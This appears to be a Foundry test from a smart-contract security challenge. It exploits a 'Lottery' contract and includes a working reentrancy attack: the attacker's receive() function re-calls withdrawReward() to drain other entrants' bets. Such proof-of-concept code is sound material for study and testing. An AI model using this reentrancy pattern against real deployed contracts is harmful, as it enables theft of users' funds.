// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Lottery} from "../src/challenge_2.sol";

contract LotteryTest is Test {
    Lottery private lottery;
    address private attacker;
    address private entrant1;
    address private entrant2;
    uint256 amountToBet = 0.1 ether;

    function setUp() public {
        // setup attacker
        attacker = address(this);
        deal(attacker, 1_000 ether);

        // set up additional entrants
        entrant1 = makeAddr("entrant1");
        deal(entrant1, 1_000 ether);
        entrant2 = makeAddr("entrant2");
        deal(entrant2, 1_000 ether);

        // create lottery
        lottery = new Lottery();
    }

    function test_vulnerability() public {
        // attacker enters
        vm.startPrank(attacker);
        lottery.enterLottery{value: amountToBet}();
        vm.stopPrank();

        // entrants enter
        vm.startPrank(entrant1);
        lottery.enterLottery{value: amountToBet * 10}();
        vm.stopPrank();

        vm.startPrank(entrant2);
        lottery.enterLottery{value: amountToBet * 10}();
        vm.stopPrank();

        // advance time
        vm.warp(1 days + 1);

        // distribute rewards & claim
        vm.startPrank(attacker);
        lottery.distributeRewards();
        lottery.withdrawReward();
        vm.stopPrank();

        // validate
        console2.log("attacker balance: ", attacker.balance);
        console2.log("lottery balance: ", address(lottery).balance);
        assertGt(attacker.balance, amountToBet);
    }

    receive() external payable {
        if (address(lottery).balance > amountToBet) {
            vm.startPrank(attacker);
            lottery.withdrawReward();
            vm.stopPrank();
        }
    }
}